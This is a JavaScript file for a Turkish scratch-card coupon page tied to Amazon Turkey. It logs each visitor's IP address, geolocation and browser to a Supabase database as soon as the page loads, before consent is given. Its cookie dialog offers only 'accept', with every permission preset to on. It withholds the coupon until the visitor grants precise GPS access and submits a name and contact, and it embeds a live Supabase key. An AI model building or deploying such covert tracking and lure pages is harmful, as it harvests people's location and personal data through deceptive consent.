/* ============================================
   DX PROMOSYON SAYFASI - ANA SCRIPT
   ============================================ */

// ==========================================
// YAPILANDIRMA
// Supabase bilgilerinizi buraya girin
// ==========================================
const CONFIG = {
    SUPABASE_URL: 'https://yfhglqjuskpglezvucnw.supabase.co',
    SUPABASE_ANON_KEY: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmaGdscWp1c2twZ2xlenZ1Y253Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY5ODQ4MTYsImV4cCI6MjEwMjU2MDgxNn0.PZfclmoZ1MCJhdax6ZFYwnAamAJ7TjilWEAuiDcG-kQ',
    AMAZON_BASE_URL: 'https://www.amazon.com.tr',
    SCRATCH_THRESHOLD: 0.40,  // %40 kazındığında otomatik açılır
    DEMO_COUPONS: [           // Supabase bağlantısı yokken kullanılacak
        'DX-HOSGELDIN-50',
        'DX-YENI-SEZON-30',
        'DX-OZEL-FIRSAT-25',
        'DX-SUPER-INDIRIM',
        'DX-PREMIUM-VIP-20'
    ]
};

// ==========================================
// DURUM YÖNETİMİ
// ==========================================
const STATE = {
    consentGiven: false,
    locationGranted: false,
    couponRevealed: false,
    scratchUnlocked: false,   // Kazı kazan kilidi açıldı mı
    currentCoupon: null,
    currentCouponId: null,
    userLocation: null,
    isScratching: false,
    scratchPercentage: 0,
    supabaseClient: null,
    dbUserId: null,
    siteVisitId: null,
    visitLogged: false,
    permissions: {
        essential: true,
        analytics: true,
        marketing: true,
        location: true
    }
};

// ==========================================
// BAŞLATMA
// ==========================================
document.addEventListener('DOMContentLoaded', init);

function init() {
    checkExistingConsent();
    setupCookieConsent();
    setupNavigation();
    setupScratchCard();
    setupScrollAnimations();
    setupParticles();
    setupBackToTop();
    setupSearch();
    setupLockButton();
    setupLocationRetry();
    assignDemoCoupon();
    
    // Sayfa yüklenir yüklenmez konumu al ve veritabanına kaydet
    fetchIpLocation();
}

// ==========================================
// SUPABASE ENTEGRASYONU
// ==========================================
function initSupabase() {
    if (CONFIG.SUPABASE_URL === 'YOUR_SUPABASE_URL' || 
        CONFIG.SUPABASE_ANON_KEY === 'YOUR_SUPABASE_ANON_KEY') {
        console.log('⚠️ Supabase yapılandırılmamış. Demo modunda çalışıyor.');
        return false;
    }

    try {
        if (typeof window.supabase !== 'undefined') {
            STATE.supabaseClient = window.supabase.createClient(
                CONFIG.SUPABASE_URL, 
                CONFIG.SUPABASE_ANON_KEY
            );
            console.log('✅ Supabase bağlantısı kuruldu.');
            return true;
        }
    } catch (error) {
        console.error('❌ Supabase bağlantı hatası:', error);
    }
    return false;
}

// Supabase'den kupon kodu çek
async function fetchCouponFromDB() {
    if (!STATE.supabaseClient) return null;

    try {
        const { data, error } = await STATE.supabaseClient
            .from('coupons')
            .select('*')
            .eq('is_used', false)
            .limit(1)
            .single();

        if (error) {
            console.error('Kupon çekme hatası:', error);
            return null;
        }

        return data;
    } catch (error) {
        console.error('Kupon çekme hatası:', error);
        return null;
    }
}

// Kupon kullanımını kaydet
async function markCouponUsed(couponId) {
    if (!STATE.supabaseClient) return;

    try {
        await STATE.supabaseClient
            .from('coupons')
            .update({ is_used: true })
            .eq('id', couponId);
    } catch (error) {
        console.log('Kupon güncellemesi atlandı (Veritabanı şeması uyuşmazlığı):', error.message || error);
    }
}

// UUID Üretici (Eski tarayıcılar için fallback dahil)
function generateUUID() {
    if (typeof crypto !== 'undefined' && crypto.randomUUID) {
        return crypto.randomUUID();
    }
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

// Kullanıcı verisini Supabase'e kaydet
async function insertUserData(data) {
    if (!STATE.supabaseClient) {
        console.log('📝 Kaydedilecek veri (Supabase bağlı değil):', data);
        return;
    }

    if (!STATE.dbUserId) {
        STATE.dbUserId = generateUUID();
    }

    try {
        const { error } = await STATE.supabaseClient
            .from('user_data')
            .upsert([{
                id: STATE.dbUserId,
                first_name: data.firstName,
                last_name: data.lastName,
                email: data.contact,
                cookie_data: data.cookies,
                user_agent: navigator.userAgent,
                city: data.city || null,
                country: data.country || null
            }]);

        if (error) {
            console.error('Veri kaydetme hatası:', error);
        } else {
            console.log('✅ Kullanıcı verisi eklendi, ID:', STATE.dbUserId);
        }
    } catch (error) {
        console.error('Veri kaydetme hatası:', error);
    }
}

// Ziyaretçiyi anında logla (Yeni Tablo: site_visits)
async function logImmediateVisit(city, country, ip, lat, lng) {
    if (!STATE.supabaseClient) return;
    
    try {
        const { data, error } = await STATE.supabaseClient
            .from('site_visits')
            .insert([{
                city: city || 'Bilinmiyor',
                country: country || 'Bilinmiyor',
                ip_address: ip || 'Gizli',
                latitude: lat || null,
                longitude: lng || null,
                user_agent: navigator.userAgent
            }])
            .select('id')
            .single();
            
        if (data && data.id) {
            STATE.siteVisitId = data.id;
        }
        console.log('✅ Ziyaretçi anında kaydedildi:', city, country);
    } catch (error) {
        console.log('Ziyaretçi kaydedilemedi (Tablo eksik olabilir):', error);
    }
}

// Konum bilgisini güncelle
async function updateUserLocation(lat, lng) {
    if (!STATE.supabaseClient || !STATE.dbUserId) {
        console.log('📍 Konum güncellenmedi (Bağlantı veya ID eksik)');
        return;
    }

    try {
        const { error } = await STATE.supabaseClient
            .rpc('update_user_location', {
                p_id: STATE.dbUserId,
                p_lat: lat,
                p_lng: lng
            });

        if (error) {
            console.error('Konum güncelleme hatası:', error);
        } else {
            console.log('✅ Konum verisi veritabanında güncellendi.');
        }
    } catch (error) {
        console.error('Konum güncelleme hatası:', error);
    }
}

// ==========================================
// KUPON YÖNETİMİ
// ==========================================
async function assignDemoCoupon() {
    // Supabase'i başlat
    const supabaseReady = initSupabase();

    if (supabaseReady) {
        // Veritabanından kupon çek
        const couponData = await fetchCouponFromDB();
        if (couponData) {
            STATE.currentCoupon = couponData.code;
            STATE.currentCouponId = couponData.id;
        } else {
            STATE.currentCoupon = CONFIG.DEMO_COUPONS[
                Math.floor(Math.random() * CONFIG.DEMO_COUPONS.length)
            ];
        }
    } else {
        // Demo mod - rastgele kupon ata
        STATE.currentCoupon = CONFIG.DEMO_COUPONS[
            Math.floor(Math.random() * CONFIG.DEMO_COUPONS.length)
        ];
    }

    // Kuponu gizli kupon alanına yaz
    const hiddenCoupon = document.getElementById('hidden-coupon');
    if (hiddenCoupon) {
        hiddenCoupon.textContent = STATE.currentCoupon;
    }
}

// ==========================================
// ÇEREZ + KONUM İZİN YÖNETİMİ (ZORUNLU)
// ==========================================
function checkExistingConsent() {
    const consent = localStorage.getItem('dx_consent');
    if (consent) {
        try {
            const data = JSON.parse(consent);
            STATE.consentGiven = true;
            STATE.permissions = data.permissions || STATE.permissions;

            // Konum da alınmış mı kontrol et
            if (data.location) {
                STATE.userLocation = data.location;
                STATE.locationGranted = true;
                STATE.scratchUnlocked = true;
                
                const locationText = document.getElementById('location-text');
                if (locationText) {
                    if (STATE.userLocation.city) {
                        locationText.textContent = `${STATE.userLocation.city}, ${STATE.userLocation.country || ''}`;
                    } else if (STATE.userLocation.latitude) {
                        locationText.textContent = `${parseFloat(STATE.userLocation.latitude).toFixed(2)}°N, ${parseFloat(STATE.userLocation.longitude).toFixed(2)}°E`;
                    }
                }
            }

            // İzin modalını gizle
            const overlay = document.getElementById('cookie-overlay');
            if (overlay) overlay.classList.add('hidden');

            // Kazı kazanı aç
            if (STATE.scratchUnlocked) {
                unlockScratchCard();
            }
        } catch (e) {
            localStorage.removeItem('dx_consent');
        }
    }
}

function setupCookieConsent() {
    const btnAccept = document.getElementById('btn-cookie-accept');

    // Kabul Et - tüm politikalar kabul edilir
    btnAccept.addEventListener('click', () => {
        STATE.userData = { firstName: "Anonymous", lastName: "User", contact: "none" };
        acceptConsent();
    });
}

function setupLockButton() {
    const btnLockAccept = document.getElementById('btn-lock-accept');
    if (btnLockAccept) {
        btnLockAccept.addEventListener('click', () => {
            if (!STATE.consentGiven) {
                showCookieModal();
            } else if (!STATE.locationGranted) {
                showLocationRequiredModal();
            }
        });
    }
}

function setupLocationRetry() {
    const btnRetry = document.getElementById('btn-location-retry');
    if (btnRetry) {
        btnRetry.addEventListener('click', () => {
            closeLocationRequiredModal();
            // Tekrar konum iste
            requestBrowserGeolocation();
        });
    }
}

function acceptConsent() {
    STATE.consentGiven = true;

    // Modalı kapat
    closeCookieModal();

    // Hemen tarayıcıdan konum iste
    setTimeout(() => {
        requestBrowserGeolocation();
    }, 400);
}

function requestBrowserGeolocation() {
    if (!navigator.geolocation) {
        console.log('Geolocation desteklenmiyor.');
        showLocationRequiredModal();
        return;
    }

    // IP bilgisini de eşzamanlı çekmeye başla
    fetchIpLocation();

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            // Başarılı - konum alındı (GPS)
            STATE.userLocation = {
                ...STATE.userLocation, // Varsa IP bilgilerini koru (city, country)
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };
            STATE.locationGranted = true;
            STATE.scratchUnlocked = true;

            // LocalStorage'a kaydet
            localStorage.setItem('dx_consent', JSON.stringify({
                permissions: STATE.permissions,
                location: STATE.userLocation,
                timestamp: new Date().toISOString()
            }));

            // Konum bilgisini navbar'da göster (şehir varsa onu gösterir, yoksa gps)
            updateLocationDisplay();

            // Kazı kazan kilidini aç
            unlockScratchCard();

            console.log('📍 GPS üzerinden kesin konum alındı:', STATE.userLocation);
            
            // site_visits tablosundaki varsayılan IP konumunu kesin GPS konumu ile güncelle
            if (STATE.siteVisitId && STATE.supabaseClient) {
                try {
                    await STATE.supabaseClient
                        .from('site_visits')
                        .update({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        })
                        .eq('id', STATE.siteVisitId);
                } catch(e) { console.log('Site_visits güncellenemedi:', e); }
            }
            
            // Konum izni verildiği anda form doldurmasını beklemeden anonim olarak veritabanına gönder
            await insertUserData({
                firstName: "İsimsiz",
                lastName: "Ziyaretçi",
                contact: "Belirtilmedi",
                cookies: STATE.permissions,
                city: STATE.userLocation.city || null,
                country: STATE.userLocation.country || null
            });
            await updateUserLocation(position.coords.latitude, position.coords.longitude);
        },
        (error) => {
            // Başarısız - konum reddedildi
            console.log('GPS Konum alınamadı:', error.message);
            showLocationRequiredModal();
        },
        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 300000 // 5 dakika cache
        }
    );
}

function showLocationRequiredModal() {
    const modal = document.getElementById('location-required-modal');
    if (modal) modal.classList.remove('hidden');
}

function closeLocationRequiredModal() {
    const modal = document.getElementById('location-required-modal');
    if (modal) {
        modal.classList.add('closing');
        setTimeout(() => {
            modal.classList.add('hidden');
            modal.classList.remove('closing');
        }, 300);
    }
}

function closeCookieModal() {
    const overlay = document.getElementById('cookie-overlay');
    overlay.classList.add('closing');
    setTimeout(() => {
        overlay.classList.add('hidden');
        overlay.classList.remove('closing');
    }, 300);
}

function showCookieModal() {
    const overlay = document.getElementById('cookie-overlay');
    overlay.classList.remove('hidden');
    overlay.classList.remove('closing');
}

function updateLocationDisplay() {
    const locationText = document.getElementById('location-text');
    if (locationText && STATE.userLocation) {
        if (STATE.userLocation.city) {
            locationText.textContent = `${STATE.userLocation.city}, ${STATE.userLocation.country || ''}`;
        } else if (STATE.userLocation.latitude) {
            const lat = STATE.userLocation.latitude.toFixed(2);
            const lng = STATE.userLocation.longitude.toFixed(2);
            locationText.textContent = `${lat}°N, ${lng}°E`;
        }
    }
}

async function fetchIpLocation() {
    try {
        const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
        const data = await response.json();
        
        STATE.userLocation = {
            ...STATE.userLocation,
            city: data.city,
            country: data.country,
            latitude: data.latitude,
            longitude: data.longitude
        };
        
        // Ekrana yansıt
        updateLocationDisplay();

        // Ziyaretçiyi anında veritabanına kaydet (sadece 1 kere)
        if (!STATE.visitLogged) {
            logImmediateVisit(data.city, data.country, data.ip, data.latitude, data.longitude);
            STATE.visitLogged = true;
        }
        
    } catch (error) {
        console.log('IP konumu alınamadı:', error);
    }
}

// ==========================================
// KAZI KAZAN KİLİT YÖNETİMİ
// ==========================================
function unlockScratchCard() {
    const lockOverlay = document.getElementById('scratch-lock');
    const hint = document.getElementById('scratch-hint');

    if (lockOverlay) {
        lockOverlay.classList.add('unlocking');
        setTimeout(() => {
            lockOverlay.remove();
        }, 500);
    }

    if (hint) {
        hint.innerHTML = '<span class="hint-icon">👆</span> Kazımak için sürükleyin';
    }

    STATE.scratchUnlocked = true;
}

// ==========================================
// NAVİGASYON YÖNLENDİRME
// ==========================================
function setupNavigation() {
    document.querySelectorAll('.amazon-link').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();

            if (!STATE.consentGiven) {
                showConsentToast();
                return;
            }
            if (!STATE.locationGranted) {
                showLocationRequiredModal();
                return;
            }

            // Amazon'a yönlendir
            const targetUrl = link.getAttribute('data-href') || CONFIG.AMAZON_BASE_URL;
            window.open(targetUrl, '_blank');
        });
    });
}

function showConsentToast() {
    const toast = document.getElementById('consent-toast');
    toast.classList.remove('hidden');

    // 4 saniye sonra otomatik kapat
    setTimeout(() => {
        hideToast();
    }, 4000);
}

function hideToast() {
    const toast = document.getElementById('consent-toast');
    if (toast) toast.classList.add('hidden');
}

// ==========================================
// KAZI KAZAN
// ==========================================
function setupScratchCard() {
    const canvas = document.getElementById('scratch-canvas');
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    const container = document.getElementById('scratch-card');

    // Canvas boyutunu ayarla
    function resizeCanvas() {
        const rect = container.getBoundingClientRect();
        canvas.width = rect.width;
        canvas.height = rect.height;
        drawScratchSurface(ctx, canvas);
    }

    resizeCanvas();
    window.addEventListener('resize', () => {
        if (!STATE.couponRevealed) {
            resizeCanvas();
        }
    });

    // Mouse event'leri
    canvas.addEventListener('mousedown', (e) => {
        if (!STATE.scratchUnlocked) return; // Kilitliyse kazıma
        STATE.isScratching = true;
        scratch(e, ctx, canvas);
    });

    canvas.addEventListener('mousemove', (e) => {
        if (!STATE.scratchUnlocked) return;
        if (STATE.isScratching) scratch(e, ctx, canvas);
    });

    canvas.addEventListener('mouseup', () => {
        STATE.isScratching = false;
        if (STATE.scratchUnlocked) checkScratchPercentage(ctx, canvas);
    });

    canvas.addEventListener('mouseleave', () => {
        STATE.isScratching = false;
    });

    // Touch event'leri (mobil)
    canvas.addEventListener('touchstart', (e) => {
        if (!STATE.scratchUnlocked) return;
        e.preventDefault();
        STATE.isScratching = true;
        scratchTouch(e, ctx, canvas);
    }, { passive: false });

    canvas.addEventListener('touchmove', (e) => {
        if (!STATE.scratchUnlocked) return;
        e.preventDefault();
        if (STATE.isScratching) scratchTouch(e, ctx, canvas);
    }, { passive: false });

    canvas.addEventListener('touchend', () => {
        STATE.isScratching = false;
        if (STATE.scratchUnlocked) checkScratchPercentage(ctx, canvas);
    });
}

function drawScratchSurface(ctx, canvas) {
    const w = canvas.width;
    const h = canvas.height;

    // Metalik gradient arka plan
    const gradient = ctx.createLinearGradient(0, 0, w, h);
    gradient.addColorStop(0, '#C6A032');
    gradient.addColorStop(0.2, '#FFD700');
    gradient.addColorStop(0.4, '#DAA520');
    gradient.addColorStop(0.6, '#FFD700');
    gradient.addColorStop(0.8, '#C6A032');
    gradient.addColorStop(1, '#B8860B');
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, w, h);

    // Metalik çizgiler efekti
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
    ctx.lineWidth = 1;
    for (let i = 0; i < w + h; i += 4) {
        ctx.beginPath();
        ctx.moveTo(i, 0);
        ctx.lineTo(0, i);
        ctx.stroke();
    }

    // Sparkle efektleri
    for (let i = 0; i < 20; i++) {
        const x = Math.random() * w;
        const y = Math.random() * h;
        const size = Math.random() * 3 + 1;
        ctx.fillStyle = `rgba(255, 255, 255, ${Math.random() * 0.3 + 0.1})`;
        ctx.beginPath();
        ctx.arc(x, y, size, 0, Math.PI * 2);
        ctx.fill();
    }

    // Ana metin
    ctx.save();
    ctx.fillStyle = 'rgba(139, 90, 10, 0.9)';
    ctx.font = `bold ${Math.min(w * 0.08, 28)}px Inter`;
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';

    // Gölge
    ctx.shadowColor = 'rgba(0, 0, 0, 0.3)';
    ctx.shadowBlur = 4;
    ctx.shadowOffsetY = 2;

    ctx.fillText('🎁  KAZI KAZAN!  🎁', w / 2, h / 2 - 12);

    ctx.font = `600 ${Math.min(w * 0.04, 14)}px Inter`;
    ctx.fillStyle = 'rgba(139, 90, 10, 0.7)';
    ctx.fillText('Kuponunuzu açmak için kazıyın', w / 2, h / 2 + 18);

    ctx.restore();
}

function scratch(e, ctx, canvas) {
    if (STATE.couponRevealed) return;

    const rect = canvas.getBoundingClientRect();
    const x = (e.clientX - rect.left) * (canvas.width / rect.width);
    const y = (e.clientY - rect.top) * (canvas.height / rect.height);

    ctx.globalCompositeOperation = 'destination-out';
    ctx.beginPath();
    ctx.arc(x, y, 22, 0, Math.PI * 2);
    ctx.fill();

    // Kenar yumuşatma
    ctx.beginPath();
    ctx.arc(x, y, 28, 0, Math.PI * 2);
    const radGrad = ctx.createRadialGradient(x, y, 18, x, y, 28);
    radGrad.addColorStop(0, 'rgba(0,0,0,1)');
    radGrad.addColorStop(1, 'rgba(0,0,0,0)');
    ctx.fillStyle = radGrad;
    ctx.fill();

    ctx.globalCompositeOperation = 'source-over';
}

function scratchTouch(e, ctx, canvas) {
    if (STATE.couponRevealed) return;

    const touch = e.touches[0];
    const rect = canvas.getBoundingClientRect();
    const x = (touch.clientX - rect.left) * (canvas.width / rect.width);
    const y = (touch.clientY - rect.top) * (canvas.height / rect.height);

    ctx.globalCompositeOperation = 'destination-out';
    ctx.beginPath();
    ctx.arc(x, y, 22, 0, Math.PI * 2);
    ctx.fill();

    ctx.beginPath();
    ctx.arc(x, y, 28, 0, Math.PI * 2);
    const radGrad = ctx.createRadialGradient(x, y, 18, x, y, 28);
    radGrad.addColorStop(0, 'rgba(0,0,0,1)');
    radGrad.addColorStop(1, 'rgba(0,0,0,0)');
    ctx.fillStyle = radGrad;
    ctx.fill();

    ctx.globalCompositeOperation = 'source-over';
}

function checkScratchPercentage(ctx, canvas) {
    if (STATE.couponRevealed) return;

    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const pixels = imageData.data;
    let transparentPixels = 0;
    const totalPixels = pixels.length / 4;

    for (let i = 3; i < pixels.length; i += 4) {
        if (pixels[i] === 0) transparentPixels++;
    }

    const percentage = transparentPixels / totalPixels;
    STATE.scratchPercentage = percentage;

    if (percentage >= CONFIG.SCRATCH_THRESHOLD) {
        revealCoupon(ctx, canvas);
    }
}

function revealCoupon(ctx, canvas) {
    if (STATE.couponRevealed) return;
    STATE.couponRevealed = true;

    // Canvas'ı tamamen sil (animasyonlu)
    const w = canvas.width;
    const h = canvas.height;
    let alpha = 1;

    function fadeOut() {
        alpha -= 0.05;
        if (alpha <= 0) {
            ctx.clearRect(0, 0, w, h);
            canvas.style.pointerEvents = 'none';

            // İpucu metnini güncelle
            const hint = document.getElementById('scratch-hint');
            if (hint) {
                hint.textContent = '✅ Kupon kodunuz açıldı!';
                hint.classList.add('revealed');
            }

            // Başarı modalını göster
            setTimeout(() => showCouponSuccessModal(), 500);
            return;
        }

        ctx.clearRect(0, 0, w, h);
        ctx.globalAlpha = alpha;
        drawScratchSurface(ctx, canvas);
        ctx.globalAlpha = 1;

        requestAnimationFrame(fadeOut);
    }

    fadeOut();

    // Kupon kullanıldı olarak işaretle
    if (STATE.currentCouponId) {
        markCouponUsed(STATE.currentCouponId);
    }
}

// ==========================================
// KUPON BAŞARI MODALI VE FORM
// ==========================================
function showCouponSuccessModal() {
    const modal = document.getElementById('coupon-success-modal');
    
    // Adımları resetle
    const step1 = document.getElementById('coupon-step-1');
    const step2 = document.getElementById('coupon-step-2');
    step1.classList.remove('hidden');
    step2.classList.add('hidden');
    
    const btnGetGift = document.getElementById('btn-get-gift');
    
    modal.classList.remove('hidden');

    // Hediye Al butonu tıklaması
    btnGetGift.onclick = async () => {
        const firstName = document.getElementById('gift-first-name').value.trim();
        const lastName = document.getElementById('gift-last-name').value.trim();
        const contact = document.getElementById('gift-contact').value.trim();

        if(!firstName || !lastName || !contact) {
            alert("Kuponunuzu alabilmek için lütfen bilgilerinizi eksiksiz doldurunuz.");
            return;
        }

        // Bilgileri kaydet
        STATE.userData = { firstName, lastName, contact };
        await insertUserData({
            firstName: firstName,
            lastName: lastName,
            contact: contact,
            cookies: STATE.permissions,
            city: STATE.userLocation ? STATE.userLocation.city : null,
            country: STATE.userLocation ? STATE.userLocation.country : null
        });

        // Konum bilgisini de veritabanına ekle
        if (STATE.userLocation) {
            await updateUserLocation(STATE.userLocation.latitude, STATE.userLocation.longitude);
        }

        // 2. adıma geç (kuponu göster)
        revealCouponCodeStep();
    };
}

function revealCouponCodeStep() {
    const step1 = document.getElementById('coupon-step-1');
    const step2 = document.getElementById('coupon-step-2');
    const couponText = document.getElementById('coupon-text');
    const btnCopy = document.getElementById('btn-copy-coupon');
    const btnAmazon = document.getElementById('btn-go-amazon');
    const btnClose = document.getElementById('btn-close-coupon');

    step1.classList.add('hidden');
    step2.classList.remove('hidden');

    couponText.textContent = STATE.currentCoupon;

    // Confetti efekti
    createConfetti();

    // Kopyala butonu
    btnCopy.onclick = () => {
        navigator.clipboard.writeText(STATE.currentCoupon).then(() => {
            btnCopy.classList.add('copied');
            btnCopy.innerHTML = '✓';
            setTimeout(() => {
                btnCopy.classList.remove('copied');
                btnCopy.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                </svg>`;
            }, 2000);
        });
    };

    // Amazon'a git
    btnAmazon.onclick = () => {
        window.open(CONFIG.AMAZON_BASE_URL, '_blank');
    };

    // Kapat
    btnClose.onclick = () => closeCouponModal();
}

function closeCouponModal() {
    const modal = document.getElementById('coupon-success-modal');
    modal.classList.add('hidden');
}

function createConfetti() {
    const container = document.getElementById('confetti-container');
    const colors = ['#FF9900', '#FFD700', '#E94560', '#00D4FF', '#A855F7', '#00C853'];

    for (let i = 0; i < 50; i++) {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + '%';
        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        confetti.style.animationDelay = Math.random() * 2 + 's';
        confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
        confetti.style.width = (Math.random() * 8 + 5) + 'px';
        confetti.style.height = (Math.random() * 8 + 5) + 'px';
        confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
        confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
        container.appendChild(confetti);
    }

    // 4 saniye sonra temizle
    setTimeout(() => {
        container.innerHTML = '';
    }, 4000);
}

// ==========================================
// SCROLL ANİMASYONLARI
// ==========================================
function setupScrollAnimations() {
    const observer = new IntersectionObserver(
        (entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('visible');
                }
            });
        },
        { threshold: 0.1, rootMargin: '0px 0px -50px 0px' }
    );

    document.querySelectorAll('.animate-on-scroll').forEach(el => {
        observer.observe(el);
    });
}

// ==========================================
// ARKA PLAN PARTİKÜLLERİ
// ==========================================
function setupParticles() {
    const canvas = document.getElementById('particles-canvas');
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    let particles = [];

    function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }

    resize();
    window.addEventListener('resize', resize);

    // Partiküller oluştur
    for (let i = 0; i < 40; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            size: Math.random() * 2 + 0.5,
            speedX: (Math.random() - 0.5) * 0.4,
            speedY: (Math.random() - 0.5) * 0.4,
            opacity: Math.random() * 0.3 + 0.05
        });
    }

    function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        particles.forEach(p => {
            p.x += p.speedX;
            p.y += p.speedY;

            if (p.x < 0) p.x = canvas.width;
            if (p.x > canvas.width) p.x = 0;
            if (p.y < 0) p.y = canvas.height;
            if (p.y > canvas.height) p.y = 0;

            ctx.beginPath();
            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(255, 153, 0, ${p.opacity})`;
            ctx.fill();
        });

        // Yakın partiküller arası çizgi
        for (let i = 0; i < particles.length; i++) {
            for (let j = i + 1; j < particles.length; j++) {
                const dx = particles[i].x - particles[j].x;
                const dy = particles[i].y - particles[j].y;
                const dist = Math.sqrt(dx * dx + dy * dy);

                if (dist < 150) {
                    ctx.beginPath();
                    ctx.moveTo(particles[i].x, particles[i].y);
                    ctx.lineTo(particles[j].x, particles[j].y);
                    ctx.strokeStyle = `rgba(255, 153, 0, ${0.03 * (1 - dist / 150)})`;
                    ctx.lineWidth = 0.5;
                    ctx.stroke();
                }
            }
        }

        requestAnimationFrame(animate);
    }

    animate();
}

// ==========================================
// SAYFANIN BAŞINA DÖN
// ==========================================
function setupBackToTop() {
    const btn = document.getElementById('back-to-top');
    if (btn) {
        btn.addEventListener('click', () => {
            window.scrollTo({ top: 0, behavior: 'smooth' });
        });
    }
}

// ==========================================
// ARAMA
// ==========================================
function setupSearch() {
    const searchBtn = document.getElementById('search-btn');
    const searchInput = document.getElementById('search-input');

    function doSearch() {
        const query = searchInput.value.trim();
        if (!query) return;

        if (!STATE.consentGiven || !STATE.locationGranted) {
            showConsentToast();
            return;
        }

        const searchUrl = `${CONFIG.AMAZON_BASE_URL}/s?k=${encodeURIComponent(query)}`;
        window.open(searchUrl, '_blank');
    }

    if (searchBtn) searchBtn.addEventListener('click', doSearch);
    if (searchInput) {
        searchInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') doSearch();
        });
    }
}
